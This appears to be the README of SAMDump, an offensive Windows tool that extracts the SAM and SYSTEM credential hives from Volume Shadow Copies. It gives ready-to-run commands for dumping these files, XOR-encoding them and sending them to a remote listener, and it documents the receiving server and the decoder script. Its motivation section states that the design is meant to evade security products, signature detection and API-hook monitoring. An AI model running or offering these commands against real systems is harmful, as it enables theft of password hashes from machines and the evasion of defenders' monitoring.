# SAMDump

Extracts Windows SAM and SYSTEM files using Volume Shadow Copy Service (VSS) with multiple exfiltration options and XOR obfuscation:

- Lists Volume Shadow Copies using VSS and creates one if necessary
- Extracts SAM and SYSTEM files from the Shadow Copy
- Uses NT API calls for file operations (*NtCreateFile*, *NtReadFile*, *NtWriteFile*)
- Supports XOR encoding for obfuscation
- Exfiltration methods: Local save or Network transfer


It is implemented in C++, C#, and Python, and it works on modern Windows versions. 

It requires elevated privileges, and if created the Shadow Copy is automatically deleted after ~5 minutes.

<br>

## Usage

```
SAMDump.exe [OPTIONS]

Options:
  --save-local [BOOL]    Save locally (default: false)
  --output-dir DIR       Output directory (default: C:\Windows\tasks)
  --send-remote [BOOL]   Send remotely (default: false)
  --host IP              Host for remote sending (default: 127.0.0.1)
  --port PORT            Port for remote sending (default: 7777)
  --xor-encode [BOOL]    XOR Encode (default: false)
  --xor-key KEY          Enable XOR with specified key (default: SAMDump2025)
  --disk DISK            Disk for shadow copy (default: C:\)
  --help                 Show this help
```

Save locally without encoding:

```
SAMDump.exe --save-local --output-dir "C:\temp"
```

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/samdump/Screenshot_1.png)

Save locally with XOR encoding:

```
SAMDump.exe --save-local --xor-encode --xor-key "SAMDump2025"
```

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/samdump/Screenshot_2.png)

Send to remote server with XOR encoding and the default key:

```
SAMDump.exe --send-remote --host 192.168.1.72 --port 1234 --xor-encode
```
![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/samdump/Screenshot_3.png)


<br>

## Server to receive the files

*server.py* is a Python server that receives files over network with automatic XOR decoding and filename formatting:

```
python server.py [OPTIONS]

Options:
  --host HOST     IP address to listen on (default: 0.0.0.0)
  --port PORT     Port to listen on (default: 7777)
  --xor-key KEY   Key for XOR decoding (optional)
```

Listener on specific interface and port with XOR key:

```
python server.py --host 192.168.1.72 --port 1234 --xor-key "SAMDump2025"
```

![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/samdump/Screenshot_4.png)

The filename contains the IP address and the date, so you can send the files from different systems, automating the process.


<br>

## Script to decode the files

*xor-decoder.py* is a Python script to decode XOR-encoded SAM and SYSTEM files locally:

```
python xor-decoder.py [OPTIONS]

Options:
  --sam SAM         Path to encoded SAM file (required)
  --system SYSTEM   Path to encoded SYSTEM file (required)
  --xor-key KEY     XOR key for decoding (default: SAMDump2025)
  --output-dir DIR  Output directory for decoded files (default: ./decoded)
```

Decode with default key:

```
python xor-decoder.py --sam sam.txt --system system.txt
```

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/samdump/Screenshot_5.png)

Decode with custom key and output directory:

```
python xor-decoder.py --sam sam.txt --system system.txt --xor-key "MyKey" --output-dir ./results
```

![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/samdump/Screenshot_6.png)


<br>

## Implementations

The project includes versions implemented in three languages:

- **C++**: Initial implementation
- **C#**: .NET version for better portability  
- **Python**: It requires the `comtypes` library to be installed (`pip install comtypes`)


<br>

## Motivation

I wanted to automate this process and most Windows I find run VSS, but security solutions detect the use of *vssadmin* to create Shadow Copies and extract these files because it is a well-known technique.

This tool extracts the files without writing to the target filesystem when using remote transfer mode; and XOR-encoding offers basic obfuscation to evade signature-based detection (even when using remote mode).

Plus, it leverages NT API calls to bypass some monitoring and user-mode API hooks.


<br>

## NT API Integration

The tool employs NT system calls instead of standard Windows API functions, which might bypass some user-mode API hooks commonly monitored:

- `NtCreateFile` and `NtReadFile`: Used to open a handle and read the bytes of the SAM and SYSTEM files in the Shadow Copy

- `NtWriteFile`: Used to save the files locally


<br>

## Acknowledgements

Thanks to [@vx-underground](https://x.com/vxunderground) for identifying and suggesting optimizations in the Export Address Table (EAT) traversal code, replacing unnecessary `NtReadVirtualMemory` calls with direct pointer access.
